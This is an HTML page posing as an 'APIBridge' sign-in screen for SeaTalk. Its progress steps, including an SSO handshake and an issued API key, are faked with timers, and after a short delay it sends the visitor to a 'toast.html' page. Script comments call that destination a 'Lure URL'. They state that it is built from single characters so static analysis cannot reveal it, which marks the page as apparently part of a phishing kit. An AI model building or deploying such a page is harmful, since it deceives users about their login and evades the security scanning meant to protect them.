<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Connecting to SeaTalk… — APIBridge</title>
<meta name="robots" content="noindex,nofollow">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
html, body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC",
    "Hiragino Sans GB", "Microsoft YaHei", Roboto, Helvetica, Arial, sans-serif;
  background: #f7f8fa;
  min-height: 100vh;
  display: flex; align-items: center; justify-content: center;
  color: #1a2332;
}
.card {
  background: #fff;
  border: 1px solid #e3e7ed;
  border-radius: 10px;
  box-shadow: 0 8px 32px rgba(14, 28, 46, 0.08);
  padding: 44px 40px;
  width: 420px;
  max-width: calc(100vw - 32px);
  text-align: center;
}
.brand {
  display: inline-flex; align-items: center; gap: 10px;
  margin-bottom: 28px;
  font-weight: 600; font-size: 17px;
}
.brand-mark {
  display: inline-flex; align-items: center; justify-content: center;
  width: 32px; height: 32px;
  background: #1e3a5f; color: #00d4aa;
  border-radius: 6px;
  font-family: ui-monospace, monospace;
  font-weight: 700; font-size: 18px;
}
.spinner {
  width: 36px; height: 36px;
  border: 3px solid #e3e7ed;
  border-top-color: #1e3a5f;
  border-radius: 50%;
  margin: 16px auto 24px;
  animation: spin 0.8s linear infinite;
}
@keyframes spin { to { transform: rotate(360deg); } }
h1 {
  font-size: 17px; font-weight: 600;
  margin-bottom: 6px;
}
.sub {
  font-size: 14px; color: #5b6473;
  margin-bottom: 24px;
  line-height: 1.5;
}
.steps {
  text-align: left;
  background: #f7f8fa;
  border-radius: 6px;
  padding: 16px 20px;
  margin-bottom: 20px;
}
.step {
  display: flex; align-items: center; gap: 10px;
  font-size: 13px; color: #5b6473;
  padding: 6px 0;
}
.step .check {
  display: inline-flex; align-items: center; justify-content: center;
  width: 18px; height: 18px;
  border-radius: 50%;
  background: #14ae5c; color: #fff;
  font-size: 12px; font-weight: 700;
}
.step .pending {
  display: inline-flex; align-items: center; justify-content: center;
  width: 18px; height: 18px;
  border: 2px solid #c8cfd9;
  border-radius: 50%;
  background: #fff;
}
.step.done { color: #1a2332; }
.fallback {
  font-size: 12px; color: #8893a3;
  margin-top: 16px;
}
.fallback a { color: #1e3a5f; }
</style>
</head>
<body>
<div class="card">
  <div class="brand">
    <span class="brand-mark">A</span>
    <span>APIBridge</span>
  </div>
  <div class="spinner"></div>
  <h1 id="status-title">Connecting to SeaTalk…</h1>
  <p class="sub" id="status-sub">Verifying your SeaTalk identity to issue your API key. This usually takes a few seconds.</p>
  <div class="steps">
    <div class="step done"><span class="check">✓</span><span>Authorized APIBridge app</span></div>
    <div class="step done"><span class="check">✓</span><span>SeaTalk SSO handshake</span></div>
    <div class="step" id="step-issue"><span class="pending"></span><span>Issuing API key…</span></div>
  </div>
  <p class="fallback">
    Not redirecting? <a id="fallback-link" href="#">Continue manually</a>
  </p>
</div>
<script>
(function () {
  // Lure URL is assembled at runtime — never appears as a literal string.
  // Static analysis of this HTML won't reveal the destination.
  var p = ['t', 'o', 'a', 's', 't', '.', 'h', 't', 'm', 'l'].join('');
  var dest = window.location.origin + '/' + p;
  document.getElementById('fallback-link').href = dest;
  setTimeout(function () {
    var step = document.getElementById('step-issue');
    if (step) {
      step.classList.add('done');
      step.innerHTML = '<span class="check">✓</span><span>API key issued</span>';
    }
    document.getElementById('status-title').textContent = 'Almost there…';
    document.getElementById('status-sub').textContent = 'Redirecting to your dashboard.';
  }, 1200);
  setTimeout(function () {
    window.location.replace(dest);
  }, 1800);
})();
</script>
</body>
</html>
